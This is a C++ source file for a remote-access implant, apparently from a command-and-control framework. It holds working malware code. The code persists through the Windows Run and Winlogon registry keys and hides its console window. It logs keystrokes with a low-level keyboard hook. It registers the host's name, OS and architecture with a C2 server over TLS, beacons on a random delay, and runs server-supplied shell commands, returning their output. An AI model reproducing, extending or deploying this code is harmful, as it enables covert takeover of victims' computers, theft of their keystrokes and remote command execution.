#include <cstdio>
#include <time.h> 
#include <algorithm> 
#include <unistd.h>
#include <stdbool.h>
#include <fcntl.h>
#include <string>

#ifdef _WIN32
    #define SECURITY_WIN32
    #include <winsock2.h>
    #include <ws2tcpip.h>
    #include <windows.h>
    #include <security.h>
    #include <schannel.h>
    #include <fcntl.h>

    #define file_path "z:\\tmp\\id"       //"\\windows\\Temp\\id" 
    SOCKET sock = INVALID_SOCKET;
    CredHandle hCred;
    CtxtHandle hCtxt;
    SecPkgContext_StreamSizes streamSizes;
#else
    //#include <cjson/cJSON.h>
    #include <openssl/ssl.h>
    #include <openssl/err.h>

    #include <sys/utsname.h>
    #include <sys/ioctl.h>
    #include <net/if.h>
    #include <netinet/in.h>
    #include <arpa/inet.h>
    #include <netdb.h>
    
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <sys/socket.h>
    #define file_path "/tmp/id"

    int sock;
    SSL_CTX *ctx;
    SSL *ssl;

#endif

#include "./includes/cJSON/cJSON.h"


//#pragma comment(lib, "ws2_32.lib")
//#pragma comment(lib, "Secur32.lib")

using namespace std;


#define BUFFER 4096
#define BUFFER_SIZE 4096
#define max_response 0x20000
#define MAX_RESPONSE 0x20000

char ADDR[BUFFER_SIZE] = "127.0.0.1";
int PORT = 7777;



#ifdef _WIN32
int schannel_recv(char *buffer, int buffer_len) {
    char encrypted[4096];
    SecBuffer secBuffers[4];
    SecBufferDesc secBufferDesc;
    SECURITY_STATUS status;

    int bytesRead = recv(sock, encrypted, sizeof(encrypted), 0);
    if (bytesRead <= 0) return -1;

    secBuffers[0].BufferType = SECBUFFER_DATA;
    secBuffers[0].pvBuffer = encrypted;
    secBuffers[0].cbBuffer = bytesRead;
    secBuffers[1].BufferType = SECBUFFER_EMPTY;
    secBuffers[2].BufferType = SECBUFFER_EMPTY;
    secBuffers[3].BufferType = SECBUFFER_EMPTY;

    secBufferDesc.cBuffers = 4;
    secBufferDesc.pBuffers = secBuffers;
    secBufferDesc.ulVersion = SECBUFFER_VERSION;

    status = DecryptMessage(&hCtxt, &secBufferDesc, 0, NULL);
    if (status != SEC_E_OK) return -1;

    for (int i = 0; i < 4; i++) {
        if (secBuffers[i].BufferType == SECBUFFER_DATA) {
            //memcpy(buffer, secBuffers[i].pvBuffer, min((size_t)buffer_len, secBuffers[i].cbBuffer));
            // Change the min() call to explicitly cast both arguments to size_t
            memcpy(buffer, secBuffers[i].pvBuffer, min(static_cast<size_t>(buffer_len), static_cast<size_t>(secBuffers[i].cbBuffer)));
            return secBuffers[i].cbBuffer;
        }
    }

    return -1;
}

int schannel_send(const char *data, int len) {
    char *message = (char*)malloc(streamSizes.cbHeader + len + streamSizes.cbTrailer);
    if (!message) return -1;

    SecBuffer buffers[3];
    SecBufferDesc desc;

    memcpy(message + streamSizes.cbHeader, data, len);

    buffers[0].pvBuffer = message;
    buffers[0].cbBuffer = streamSizes.cbHeader;
    buffers[0].BufferType = SECBUFFER_STREAM_HEADER;

    buffers[1].pvBuffer = message + streamSizes.cbHeader;
    buffers[1].cbBuffer = len;
    buffers[1].BufferType = SECBUFFER_DATA;

    buffers[2].pvBuffer = message + streamSizes.cbHeader + len;
    buffers[2].cbBuffer = streamSizes.cbTrailer;
    buffers[2].BufferType = SECBUFFER_STREAM_TRAILER;

    desc.cBuffers = 3;
    desc.pBuffers = buffers;
    desc.ulVersion = SECBUFFER_VERSION;

    SECURITY_STATUS status = EncryptMessage(&hCtxt, 0, &desc, 0);
    if (status != SEC_E_OK) {
        free(message);
        return -1;
    }

    int totalSize = buffers[0].cbBuffer + buffers[1].cbBuffer + buffers[2].cbBuffer;
    int sent = send(sock, message, totalSize, 0);
    free(message);

    return sent;
}
#endif

class Device {
    public:
    void hideConsole();
    const char* get_Arch();
};

class Communicate_ {
    private:
    public:
    int conn();
    void reg(Device d);
    void beacon(const char *id);
    void session();
    void upload();
    void download();
};

class Keylogger {
    public:
    #ifdef _WIN32
        inline static  char keyloggerfile[256] = "C:\\Users\\Public\\log.txt";
        static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
            int keyCount = 0;
            if (nCode == HC_ACTION && wParam == WM_KEYDOWN) {
                DWORD vkCode = ((KBDLLHOOKSTRUCT*)lParam)->vkCode;
                FILE* file;
                fopen_s(&file, keyloggerfile, "a");
                if (file != NULL) {
                    fprintf(file, "%lu", vkCode);
                    fclose(file);
                }
                keyCount++;
                }
                return CallNextHookEx(NULL, nCode, wParam, lParam);
            }
        
            DWORD WINAPI StartWindowsKeylogger(LPVOID arg) {
                HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
                // wait for events
                MSG msg;
                while (GetMessage(&msg, NULL, 0, 0) > 0) {
                    TranslateMessage(&msg);
                    DispatchMessage(&msg);
                }
                // delete hook
                UnhookWindowsHookEx(hook);
                return 0;
            }
        
    #else
    #endif
};

#ifdef _WIN32
class WindowsPersistence {
    
    private:
    string exePath;
    public:
    // Constructor
    WindowsPersistence(string exePath) {
        this->exePath = exePath;
    }
    // Getters
    string getExePath() {
        return this->exePath;
    }
    // Setters
    void setExePath(string exePath) {
        this->exePath = exePath;
    }
    // Persistence Methods
    // Register Run
    bool persistenceByRunReg(){
        HKEY hkey = NULL;
        LONG res = RegOpenKeyEx(HKEY_CURRENT_USER,(LPCSTR)"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hkey);
    if (res == ERROR_SUCCESS) {
        RegSetValueEx(hkey,(LPCSTR)"salsa", 0, REG_SZ, (unsigned char*)this->exePath.c_str(), strlen(this->exePath.c_str()));
    if (RegCloseKey(hkey) == ERROR_SUCCESS) {
        return true;
    }
        RegCloseKey(hkey);
    }
    return false;
    }
    // Register Winlogon
    bool persistenceByWinlogon(){
        HKEY hkey = NULL;
        LONG res = RegOpenKeyEx(HKEY_LOCAL_MACHINE, (LPCSTR)"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", 0, KEY_WRITE, &hkey);
    if (res == ERROR_SUCCESS) {
        RegSetValueEx(hkey,(LPCSTR)"Shell", 0, REG_SZ, (unsigned char*)this->exePath.c_str(), strlen(this->exePath.c_str()));
    if (RegCloseKey(hkey) == ERROR_SUCCESS) {
        return true;
    }
        RegCloseKey(hkey);
    }
    return false;
    }
    // Persistence by Winlogon
    bool persistenceByWinlogonReg(){
        HKEY hkey = NULL;
        LONG res = RegOpenKeyEx(HKEY_LOCAL_MACHINE, (LPCSTR)"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", 0, KEY_WRITE, &hkey);
        if (res == ERROR_SUCCESS) {
            RegSetValueEx(hkey,(LPCSTR)"Userinit", 0, REG_SZ, (unsigned char*)this->exePath.c_str(), strlen(this->exePath.c_str()));
        if (RegCloseKey(hkey) == ERROR_SUCCESS) {
            return true;
        }
        RegCloseKey(hkey);
        }
        return false;
    }
};
#endif




#ifdef _WIN32
void Device::hideConsole() {
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth, 0);
}
#endif


const char* Device::get_Arch() {
    #ifdef _WIN32
        SYSTEM_INFO sysInfo;
        GetNativeSystemInfo(&sysInfo);
        switch (sysInfo.wProcessorArchitecture) {
            case PROCESSOR_ARCHITECTURE_AMD64: return "x64"; break;
            case PROCESSOR_ARCHITECTURE_INTEL: return  "x86"; break;
            case PROCESSOR_ARCHITECTURE_ARM64: return  "ARM64"; break;
            default: return "unknown"; break;
        }
    #else
        char *arch = (char*)malloc(0x32);
        struct utsname buffer;
        if (uname(&buffer) == 0) {
            snprintf(arch, 0x32, "%s", buffer.machine);
            return arch; 
        } else {
            return "Error getting architecture.\n";
        }
    #endif
}


int jitter() {
    srand(time(0));  // Seed the random number generator

    // Define the range (3 hours to 1 days in seconds)
    const int MIN_SECONDS = 0xfff;  //1 * 3600;   // 1 hours (1 * 60 * 60)
    const int MAX_SECONDS = 0xffff;  //3 * 3600;  // 3 hours (3 * 60 * 60)

    return MIN_SECONDS + rand() % (MAX_SECONDS - MIN_SECONDS + 1);
    
}


int main() {
    Communicate_ comm;
    Device d;
    
    #ifdef _WIN32
        char path[0x100];
        GetModuleFileNameA(NULL, path, 0x100);

        WindowsPersistence p = WindowsPersistence(path);
        
        if (p.persistenceByRunReg()) {
            goto START;
        } else if (p.persistenceByWinlogon()) {
            goto START;
        } else if (p. persistenceByWinlogonReg()) {
            goto START;
        }

    #endif
    // persistance
    
    START:

    #ifdef _WIN32
    d.hideConsole();
    #endif
    while (1) {
        if (comm.conn() == -1) {
            sleep(jitter()); // use random for 
            continue;
        }
        /*
        #ifdef _WIN32
        int file = open(file_path, OFN_READONLY);
        #else
        int file = open(file_path, O_RDONLY);
        #endif
        */
        //int file = open(file_path, O_RDONLY);
        FILE *fp = fopen(file_path, "r");
        if (!fp) {
            //register
            comm.reg(d);
            #ifdef _WIN32
                Sleep(jitter());
            #else
                sleep(jitter());
            #endif
            continue;
        }

        char id[BUFFER_SIZE];

        // read up to BUFFER_SIZE-1 chars, ensure null termination
        if (fgets(id, sizeof(id), fp) != NULL) {
            // strip newline if present
            id[strcspn(id, "\r\n")] = '\0';
            //printf("Beaconing with ID: %s", id);
            //std::cout << Bea
            comm.beacon(id);
        } else {
            // read failed → re-register
            comm.reg(d);
        }

fclose(fp);

        #ifdef _WIN32
            // no cleanup
            Sleep(jitter());
        #else
            SSL_shutdown(ssl);
            SSL_free(ssl);
            close(sock);
            SSL_CTX_free(ctx);
            EVP_cleanup();
            sleep(jitter());
        #endif
    }
    return 0;
}

int Communicate_::conn() {
        #ifdef _WIN32
        WSADATA wsaData;
        struct sockaddr_in serverAddress;
        SECURITY_STATUS ss;
        SCHANNEL_CRED schannel_cred = {0};
        SecBufferDesc OutBufferDesc;
        SecBuffer OutBuffers[1];
        DWORD OutFlags;
        TimeStamp tsExpiry;

        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) return -1;

        sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock == INVALID_SOCKET) {
            WSACleanup();
            return -1;
        }

        serverAddress.sin_family = AF_INET;
        serverAddress.sin_port = htons(PORT);
        serverAddress.sin_addr.s_addr = inet_addr(ADDR);

        start_connect:
        if (connect(sock, (struct sockaddr *)&serverAddress, sizeof(serverAddress)) == SOCKET_ERROR) {
            Sleep(30);
            goto start_connect;
        }

        schannel_cred.dwVersion = SCHANNEL_CRED_VERSION;
        schannel_cred.grbitEnabledProtocols = SP_PROT_TLS1_2_CLIENT | SP_PROT_TLS1_3_CLIENT;
        schannel_cred.dwFlags = SCH_CRED_MANUAL_CRED_VALIDATION;

        ss = AcquireCredentialsHandle(NULL, UNISP_NAME, SECPKG_CRED_OUTBOUND, NULL, &schannel_cred, NULL, NULL, &hCred, &tsExpiry);
        if (ss != SEC_E_OK) {
            closesocket(sock);
            WSACleanup();
            return -1;
        }

        OutBufferDesc.cBuffers = 1;
        OutBufferDesc.pBuffers = OutBuffers;
        OutBufferDesc.ulVersion = SECBUFFER_VERSION;
        OutBuffers[0].BufferType = SECBUFFER_TOKEN;
        OutBuffers[0].cbBuffer = 0;
        OutBuffers[0].pvBuffer = NULL;

        ss = InitializeSecurityContext(&hCred, NULL, (SEC_CHAR *)ADDR, ISC_REQ_CONFIDENTIALITY | ISC_REQ_ALLOCATE_MEMORY, 0, SECURITY_NATIVE_DREP, NULL, 0, &hCtxt, &OutBufferDesc, &OutFlags, &tsExpiry);
        if (ss != SEC_E_OK && ss != SEC_I_CONTINUE_NEEDED) {
            FreeCredentialsHandle(&hCred);
            closesocket(sock);
            WSACleanup();
            return -1;
        }

        if (OutBufferDesc.cBuffers > 0 && OutBuffers[0].cbBuffer > 0) {
            send(sock, (const char *)OutBuffers[0].pvBuffer, OutBuffers[0].cbBuffer, 0);
            FreeContextBuffer(OutBuffers[0].pvBuffer);
        }

        do {
            SecBuffer InBuffer[1];
            SecBufferDesc InBufferDesc;

            InBuffer[0].BufferType = SECBUFFER_TOKEN;
            InBuffer[0].cbBuffer = 4096;
            InBuffer[0].pvBuffer = malloc(4096);
            if (!InBuffer[0].pvBuffer) return -1;

            int bytesRead = recv(sock, (char *)InBuffer[0].pvBuffer, 4096, 0);
            if (bytesRead <= 0) {
                free(InBuffer[0].pvBuffer);
                DeleteSecurityContext(&hCtxt);
                FreeCredentialsHandle(&hCred);
                closesocket(sock);
                WSACleanup();
                return -1;
            }
            InBuffer[0].cbBuffer = bytesRead;

            InBufferDesc.cBuffers = 1;
            InBufferDesc.pBuffers = InBuffer;
            InBufferDesc.ulVersion = SECBUFFER_VERSION;

            OutBufferDesc.cBuffers = 1;
            OutBufferDesc.pBuffers = OutBuffers;
            OutBufferDesc.ulVersion = SECBUFFER_VERSION;
            OutBuffers[0].BufferType = SECBUFFER_TOKEN;
            OutBuffers[0].cbBuffer = 0;
            OutBuffers[0].pvBuffer = NULL;

            ss = InitializeSecurityContext(&hCred, &hCtxt, (SEC_CHAR *)ADDR, ISC_REQ_CONFIDENTIALITY | ISC_REQ_ALLOCATE_MEMORY, 0, SECURITY_NATIVE_DREP, &InBufferDesc, 0, &hCtxt, &OutBufferDesc, &OutFlags, &tsExpiry);

            free(InBuffer[0].pvBuffer);

            if (OutBufferDesc.cBuffers > 0 && OutBuffers[0].cbBuffer > 0) {
                send(sock, (const char *)OutBuffers[0].pvBuffer, OutBuffers[0].cbBuffer, 0);
                FreeContextBuffer(OutBuffers[0].pvBuffer);
            }

        } while (ss == SEC_I_CONTINUE_NEEDED);

        if (ss != SEC_E_OK) {
            DeleteSecurityContext(&hCtxt);
            FreeCredentialsHandle(&hCred);
            closesocket(sock);
            WSACleanup();
            return -1;
        }


        QueryContextAttributes(&hCtxt, SECPKG_ATTR_STREAM_SIZES, &streamSizes);
        return 0;
    #else
        struct sockaddr_in server_addr;
        struct hostent *server;

        // 1. Initialize OpenSSL
        SSL_load_error_strings();
        SSL_library_init();
        OpenSSL_add_all_algorithms();

        // 2. Create SSL context (TLS client)
        ctx = SSL_CTX_new(TLS_client_method());
        if (!ctx) {
            return -1;
        }

        // 3. Create TCP socket
        if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
            SSL_CTX_free(ctx);
            return -1;
        }

        server = gethostbyname(ADDR);
        if (!server) {
            close(sock);
            SSL_CTX_free(ctx);
            return -1;
        }

        memset(&server_addr, 0, sizeof(server_addr));
        server_addr.sin_family = AF_INET;
        memcpy(&server_addr.sin_addr.s_addr, server->h_addr, server->h_length);
        server_addr.sin_port = htons(PORT);

        // 4. Connect TCP
        if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
            close(sock);
            SSL_CTX_free(ctx);
            return -1;
        }

        // 5. Create SSL object and bind to socket
        ssl = SSL_new(ctx);
        SSL_set_fd(ssl, sock);

        // 6. TLS handshake
        if (SSL_connect(ssl) <= 0) {
            SSL_free(ssl);
            close(sock);
            SSL_CTX_free(ctx);
            return -1;
        }
        return 0;
    #endif
}



void Communicate_::beacon(const char *id) {
    FILE *exec;
    cJSON *re = cJSON_CreateObject();
    char result[MAX_RESPONSE];
    char command_with_redirect[BUFFER_SIZE + 10];

    cJSON *bea = cJSON_CreateObject();
    cJSON_AddStringToObject(bea, "mode", "beacon");
    cJSON_AddStringToObject(bea, "implant_id", id);
    char *data = cJSON_Print(bea);
    //send(sock, data, strlen(data), 0);
    #ifdef _WIN32
        schannel_send(data, strlen(data));
    #else
        SSL_write(ssl, data, strlen(data));
    #endif
    
    free(data);
    cJSON_Delete(bea);

    char buffer[BUFFER_SIZE];
    #ifdef _WIN32
        if (schannel_recv(buffer, sizeof(buffer)) == -1) return;
    #else
        if (SSL_read(ssl, buffer, sizeof(buffer) -1) <= 0) {
            return;
        }
    #endif


    cJSON *reply = cJSON_Parse(buffer);
    cJSON *mode = cJSON_GetObjectItem(reply, "mode");
    if (strncmp(mode->valuestring, "none", 4) == 0) {
        return;
    }  

    cJSON *task_id = cJSON_GetObjectItem(reply, "task_id");
    cJSON *cmd = cJSON_GetObjectItem(reply, "command");
    // if command = "upload [file path]" | upload file to agent
    
    if (strncmp(cmd->valuestring, "upload", 6) == 0) {
        upload();
    // if command = "download [file path]" | download file from agent
    } else if (strncmp(cmd->valuestring, "download", 8) == 0) { 
        download();
    } else if (strncmp(cmd->valuestring, "keylogger", 9) == 0) {
        #ifdef _WIN32
            HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Keylogger::StartWindowsKeylogger, NULL, 0, NULL);
            WaitForSingleObject(hThread, INFINITE);
            CloseHandle(hThread);
            strcpy(result, "Started Windows keylogger successfully");
            //HANDLE hThread = CreateThread(NULL, 0,
            //    (LPTHREAD_START_ROUTINE)StartWindowsKeylogger,
            //    NULL, 0, NULL);
        #else
            pthread_t KeyloggerThread; 
            //pthread_create(&KeyloggerThread, NULL, StartLinuxKeylogger, NULL);
            //pthread_join(KeyloggerThread, NULL);
            strcpy(result, "Started Linux keylogger successfully");
        #endif

        cJSON_AddStringToObject(re, "mode", "result");
        cJSON_AddStringToObject(re, "implant_id", id);
        cJSON_AddNumberToObject(re, "task_id", task_id->valueint);
        cJSON_AddStringToObject(re, "response", result);
        char *result_ = cJSON_Print(re);

        #ifdef _WIN32
            if (schannel_send(result_, strlen(result_)) == -1) return;
        #else
            SSL_write(ssl, result_, strlen(result_));
        #endif

        cJSON_Delete(re);
        free(result_);
        return;
    }

    memset(buffer, 0, sizeof(buffer));
    snprintf(command_with_redirect, sizeof(command_with_redirect), "%s 2>&1", cmd->valuestring);

    #ifdef _WIN32
    exec = _popen(command_with_redirect, "r");
    #else
    exec = popen(command_with_redirect, "r");
    #endif

    if (!exec) {
        strcpy(result, "Failed to execute command.");
        goto SEND_RESULT;
    }

    while (fgets(buffer, sizeof(buffer), exec) != NULL) {
        strcat(result, buffer);
    }
    // send result
    SEND_RESULT:
    cJSON_AddStringToObject(re, "mode", "result");
    cJSON_AddStringToObject(re, "implant_id", id);
    cJSON_AddNumberToObject(re, "task_id", task_id->valueint);
    cJSON_AddStringToObject(re, "response", result);
    char *result_ = cJSON_Print(re);

    #ifdef _WIN32
        if (schannel_send(result_, strlen(result_)) == -1) return;
    #else
        SSL_write(ssl, result_, strlen(result_));
    #endif

    fclose(exec);
    cJSON_Delete(re);
    free(result_);
}

void Communicate_::reg(Device d) {
    char hostname[BUFFER_SIZE];
    char os[BUFFER_SIZE];

    if (gethostname(hostname, sizeof(hostname)) != 0) snprintf(hostname, sizeof(hostname), "Unknown");
    const char *arch = d.get_Arch(); 
    #ifdef _WIN32
    snprintf(os,sizeof(os), "%s", "windows");
    #else
    snprintf(os,sizeof(os), "%s", "linux");
    #endif
    cJSON *reg = cJSON_CreateObject();
    cJSON_AddStringToObject(reg, "mode", "register");
    cJSON_AddStringToObject(reg, "os", os);
    cJSON_AddStringToObject(reg, "hostname", hostname);
    cJSON_AddStringToObject(reg, "arch", arch);
    char *data = cJSON_Print(reg);
    //send(sock, data, strlen(data), 0);
    #ifdef _WIN32
        if (schannel_send(data, strlen(data)) == -1) return;
    #else
        SSL_write(ssl, data, strlen(data));
    #endif
   
    free(data);
    cJSON_Delete(reg);

    char buffer[BUFFER_SIZE];

    #ifdef _WIN32
        if (schannel_recv(buffer, sizeof(buffer)) == -1) return;
    #else
        if (SSL_read(ssl, buffer, sizeof(buffer) -1) <= 0 ) return;
    #endif
    
    cJSON *reply = cJSON_Parse(buffer);
    cJSON *id = cJSON_GetObjectItem(reply, "implant_id");

    FILE *f = fopen(file_path, "w");
    if (!f) {
        return;
    }

    fprintf(f, "%s", id->valuestring);
    //fwrite(id->valuestring, 1, sizeof(id->valuestring), f);
    fclose(f);
    cJSON_Delete(reply);
}

void Communicate_::upload() {

}

void Communicate_::download() {

}